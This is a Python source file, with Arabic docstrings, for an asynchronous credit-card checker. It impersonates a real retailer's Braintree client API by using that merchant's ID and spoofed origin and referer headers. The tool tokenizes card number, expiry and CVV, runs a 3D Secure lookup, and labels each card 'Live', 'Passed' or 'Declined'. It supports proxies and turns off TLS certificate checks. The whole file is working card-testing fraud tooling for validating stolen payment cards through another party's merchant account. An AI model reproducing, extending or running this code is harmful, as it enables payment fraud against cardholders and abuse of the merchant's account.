"""
بوابة الدفع: Braintree 3DS Passed LookUp 1
الموقع: www.suspensionlifts.com
نوع البوابة: Braintree 3DS LookUp
تدفق الطلبات:
1. POST https://api.braintreegateway.com/merchants/zkfxm943krx3chf3/client_api/v1/payment_methods/credit_cards -> الحصول على nonce
2. POST https://api.braintreegateway.com/merchants/zkfxm943krx3chf3/client_api/v1/payment_methods/{nonce}/three_d_secure/lookup -> النتيجة النهائية
"""
import aiohttp
import asyncio
import uuid
import ssl

MERCHANT_ID = "zkfxm943krx3chf3"
MERCHANT_SITE = "www.suspensionlifts.com"


async def req1_tokenize_card(
    session: aiohttp.ClientSession,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 1: تحويل بيانات البطاقة إلى Braintree nonce."""
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": f"https://{MERCHANT_SITE}",
        "referer": f"https://{MERCHANT_SITE}/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }
    data = {
        "creditCard": {
            "number": cc,
            "expirationMonth": mm,
            "expirationYear": yy,
            "cvv": cvv,
        },
        "endpoint": "production",
        "braintreeLibraryVersion": "braintree/web/3.94.0",
        "_meta": {
            "merchantAppId": MERCHANT_SITE,
            "platform": "web",
            "sdkVersion": "3.94.0",
            "source": "client",
            "integration": "custom",
            "integrationType": "custom",
        },
    }
    try:
        async with session.post(
            f"https://api.braintreegateway.com/merchants/{MERCHANT_ID}/client_api/v1/payment_methods/credit_cards",
            json=data,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            res = await r.json(content_type=None)

        nonce = res.get("creditCards", [{}])[0].get("nonce", "")
        if not nonce:
            raise RuntimeError("Tokenization Failed: nonce not returned")
        return nonce
    except RuntimeError:
        raise
    except Exception as e:
        raise RuntimeError(f"req1_tokenize_card failed: {e}") from e


async def req2_3ds_lookup(
    session: aiohttp.ClientSession,
    nonce: str,
    proxy_url: str = None,
) -> dict:
    """الخطوة 2: إجراء 3DS LookUp للحصول على حالة المصادقة."""
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": f"https://{MERCHANT_SITE}",
        "referer": f"https://{MERCHANT_SITE}/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }
    data = {
        "amount": "10.00",
        "additionalInfo": {
            "billingLine1": "123 Street",
            "billingCity": "New York",
            "billingPostalCode": "10001",
            "billingCountryCode": "US",
            "billingPhoneNumber": "1234567890",
            "billingGivenName": "John",
            "billingSurname": "Doe",
        },
        "dfReferenceId": str(uuid.uuid4()),
        "braintreeLibraryVersion": "braintree/web/3.94.0",
        "_meta": {
            "merchantAppId": MERCHANT_SITE,
            "platform": "web",
            "sdkVersion": "3.94.0",
            "source": "client",
            "integration": "custom",
            "integrationType": "custom",
        },
    }
    try:
        async with session.post(
            f"https://api.braintreegateway.com/merchants/{MERCHANT_ID}/client_api/v1/payment_methods/{nonce}/three_d_secure/lookup",
            json=data,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            return await r.json(content_type=None)
    except Exception as e:
        raise RuntimeError(f"req2_3ds_lookup failed: {e}") from e


async def process_B3_LookUp1_passed(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Braintree 3DS Passed LookUp 1."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            nonce = await req1_tokenize_card(session, cc, mes, ano, cvv, proxy_url)
            lookup_res = await req2_3ds_lookup(session, nonce, proxy_url)

    except RuntimeError as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", str(e)
    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    tds_info = lookup_res.get("paymentMethod", {}).get("threeDSecureInfo", {})
    status = tds_info.get("status", "")
    response_msg = ""

    if status == "challenge_required":
        response_msg = "Challenge Required"
        status_icon = "𝐋𝐢𝐯𝐞 ✅"
    elif status == "authenticate_successful":
        response_msg = "Authenticate Successful"
        status_icon = "𝐏𝐚𝐬𝐬𝐞𝐝 ✅"
    elif status == "authenticate_rejected":
        response_msg = "Authenticate Rejected"
        status_icon = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    else:
        errors = lookup_res.get("errors", [])
        response_msg = errors[0].get("message", status) if errors else (status or "Unknown")
        status_icon = "❌"

    return f"{status_icon} | {cc}|{mes}|{ano}|{cvv}", response_msg
